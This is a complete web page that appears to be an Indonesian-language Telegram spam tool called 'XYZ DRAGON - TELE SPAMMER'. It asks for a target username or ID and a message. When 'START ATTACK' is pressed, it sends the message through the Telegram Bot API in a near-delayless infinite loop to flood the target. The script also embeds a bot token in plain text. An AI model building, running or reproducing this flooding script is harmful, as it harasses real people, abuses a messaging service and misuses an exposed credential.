<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>XYZ DRAGON - TELE SPAMMER</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');
        body { background: #000; color: #ff0055; font-family: 'JetBrains Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 420px; border: 2px solid #ff0055; padding: 25px; background: #050505; box-shadow: 0 0 30px rgba(255, 0, 85, 0.3); border-radius: 12px; }
        h2 { text-align: center; letter-spacing: 2px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; font-size: 20px; }
        input, textarea { width: 100%; padding: 12px; margin-bottom: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 6px; outline: none; box-sizing: border-box; transition: 0.3s; }
        input:focus { border-color: #ff0055; box-shadow: 0 0 5px #ff0055; }
        .label { font-size: 10px; color: #666; margin-bottom: 5px; display: block; }
        .btn-start { width: 100%; padding: 15px; background: #ff0055; border: none; color: #fff; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 6px; }
        .btn-stop { width: 100%; padding: 15px; background: #fff; border: none; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; display: none; text-transform: uppercase; border-radius: 6px; }
        #status { height: 80px; overflow-y: auto; font-size: 11px; color: #00ff00; margin-top: 15px; border-top: 1px solid #222; padding-top: 10px; line-height: 1.5; }
        .count { color: #ffff00; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>🐉 TELE INFINITE SPAM</h2>
    
    <span class="label">TARGET USERNAME / ID</span>
    <input type="text" id="target" placeholder="@username atau ID">
    
    <span class="label">PENGIRIM (OPSIONAL)</span>
    <input type="text" id="sender" placeholder="Contoh: Anonymous">
    
    <span class="label">PESAN</span>
    <textarea id="message" rows="3" placeholder="Isi pesan spam..."></textarea>
    
    <button id="startBtn" class="btn-start" onclick="startAttack()">START ATTACK</button>
    <button id="stopBtn" class="btn-stop" onclick="stopAttack()">STOP ATTACK</button>

    <div id="status">> STANDBY...</div>
</div>

<script>
    const TOKEN = "8426928979:AAH9b5EBy0illWDIzsMtxlAsccmlE33Tyac";
    let isSpamming = false;
    let totalSent = 0;

    function addLog(t) {
        const log = document.getElementById('status');
        log.innerHTML = `[${new Date().toLocaleTimeString()}] ${t}<br>` + log.innerHTML;
    }

    async function startAttack() {
        const target = document.getElementById('target').value.trim();
        const sender = document.getElementById('sender').value.trim();
        const msg = document.getElementById('message').value.trim();

        if(!target || !msg) return alert("Target & Pesan wajib diisi!");

        // Format pesan
        const finalMsg = sender ? `*From: ${sender}*\n\n${msg}` : msg;

        isSpamming = true;
        totalSent = 0;
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('stopBtn').style.display = 'block';
        addLog("INITIATING INFINITE OVERLOAD...");

        while(isSpamming) {
            // Turbo Request (No Delay)
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: target,
                    text: finalMsg,
                    parse_mode: "Markdown"
                })
            }).then(res => {
                if(res.ok) {
                    totalSent++;
                    if(totalSent % 5 === 0) addLog(`SUCCESS: <span class="count">${totalSent}</span> Messages Sent`);
                } else {
                    addLog("FAILED: Rate Limited / Wrong USN", "color: red");
                }
            }).catch(() => {});

            // Delay 1ms biar browser gak crash
            await new Promise(r => setTimeout(r, 1));
        }
    }

    function stopAttack() {
        isSpamming = false;
        document.getElementById('startBtn').style.display = 'block';
        document.getElementById('stopBtn').style.display = 'none';
        addLog("ATTACK STOPPED.");
    }
</script>

</body>
</html>
